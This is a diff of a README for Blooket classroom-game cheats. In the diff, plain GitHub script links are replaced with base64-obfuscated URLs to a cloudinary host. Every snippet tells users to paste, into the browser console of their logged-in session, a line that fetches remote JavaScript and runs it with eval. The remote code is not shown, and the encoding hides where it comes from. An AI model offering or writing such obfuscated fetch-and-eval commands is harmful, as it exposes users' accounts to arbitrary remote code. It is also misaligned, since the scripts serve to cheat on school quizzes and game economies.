@@ -12,20 +12,17 @@ If the Hack / Cheat is labeled with "Bookmarklet" then simply put `javascript:` 
 
 ## News
 
-One cheat / hack has been removed since it no longer works.
+Glixzzy Blooket Hacks no longer works since he has moved them to a different location. Because of this change I have put the new scripts of the cheats here. I have also removed flood games since it no longer works. I am aware that right now this repository is sorta empty. All it contains are hacks / cheats from Glixzzy. I promise you if someone releases a better and good cheat that actually works I will add it to this repository. 
 
 ## Cheats
 
 - [Glixzzy Blooket Hacks](#glixzzy-hack)
   - [Add Tokens](#addTokens.js)
   - [Bypass Random Name](#bypassRandomName.js)
-  - [Flood Game](#floodGames.js)
   - [Get All Blooks](#getAllBlooksInGame.js)
   - [Get Every Answer Correct](#getEveryAnswerCorrect.js)
   - [Spam Blook Boxes](#spamOpenBoxes.js)
   - [Sell All Duplicate Blooks](#sellDupeBlooks.js)
-- [Glixzzy Blooket Game Hacks](#glixzzy-game)
-  - [Blooket School Cheats](#game-hack)
 
 ## Chrome Extension
 
@@ -41,59 +38,42 @@ note: **This cheat also includes adding max xp for the day**
 
 Open console (ctrl + shift + j) and paste the following:
 ```js
-fetch("https://raw.githubusercontent.com/glixzzy/blooket-hack/main/global/addTokens.js").then((res) => res.text().then((t) => eval(t)))
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dsb2JhbEFkZFRva2Vucy5qcw==')).then((res) => res.text().then((t) => eval(t)))
 ```
 
 ## <a id="bypassRandomName.js"></a>bypassRandomName.js
 
 Open console (ctrl + shift + j) and paste the following:
 ```js
-fetch("https://raw.githubusercontent.com/glixzzy/blooket-hack/main/global/bypassRandomName.js").then((res) => res.text().then((t) => eval(t)))
-```
-
-## <a id="floodGames.js"></a>floodGames.js
-
-Open console (ctrl + shift + j) and paste the following:
-```js
-fetch("https://raw.githubusercontent.com/glixzzy/blooket-hack/main/global/floodGames.js").then((res) => res.text().then((t) => eval(t)))
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dsb2JhbEJ5cGFzc1JhbmRvbU5hbWUuanM=')).then((res) => res.text().then((t) => eval(t)))
 ```
 
 ## <a id="getAllBlooksInGame.js"></a>getAllBlooksInGame.js
 
 Open console (ctrl + shift + j) and paste the following:
 ```js
-fetch("https://raw.githubusercontent.com/glixzzy/blooket-hack/main/global/getAllBlooksInGame.js").then((res) => res.text().then((t) => eval(t)))
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dsb2JhbEdldEFsbEJsb29rcy5qcw==')).then((res) => res.text().then((t) => eval(t)))
 ```
 
 ## <a id="getEveryAnswerCorrect.js"></a>getEveryAnswerCorrect.js
 
 Open console (ctrl + shift + j) and paste the following:
 ```js
-fetch("https://raw.githubusercontent.com/glixzzy/blooket-hack/main/global/getEveryAnswerCorrect.js").then((res) => res.text().then((t) => eval(t)))
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dsb2JhbEV2ZXJ5QW5zd2VyQ29ycmVjdC5qcw==')).then((res) => res.text().then((t) => eval(t)))
 ```
 
 ## <a id="spamOpenBoxes.js"></a>spamOpenBoxes.js
 
 Open console (ctrl + shift + j) and paste the following:
 ```js
-fetch("https://raw.githubusercontent.com/glixzzy/blooket-hack/main/global/spamOpenBoxes.js").then((res) => res.text().then((t) => eval(t)))
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dsb2JhbFNwYW1PcGVuQm94ZXMuanM=')).then((res) => res.text().then((t) => eval(t)))
 ```
 
 ## <a id="sellDupeBlooks.js"></a>sellDupeBlooks.js
 
 Open console (ctrl + shift + j) and paste the following:
 ```js
-fetch("https://raw.githubusercontent.com/glixzzy/blooket-hack/main/global/sellDupeBlooks.js").then((res) => res.text().then((t) => eval(t)))
-```
-# <a id="glixzzy-game"></a>Glixzzy's blooket-game-hacks (Console)
-
-I know its another repository by glixzzy but it includes gamemode hacks.
-
-## <a id="game-hack"></a>How to use?
-
-Open console (ctrl + shift = j) and paste the following:
-```js
-fetch("https://raw.githubusercontent.com/glixzzy/blooket-hack/main/main.js").then((res) => res.text().then((t) => eval(t)))
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDY2OTM2L2dsb2JhbFNlbGxEdXBlQmxvb2tzLmpz')).then((res) => res.text().then((t) => eval(t)))
 ```
 
 # More coming soon
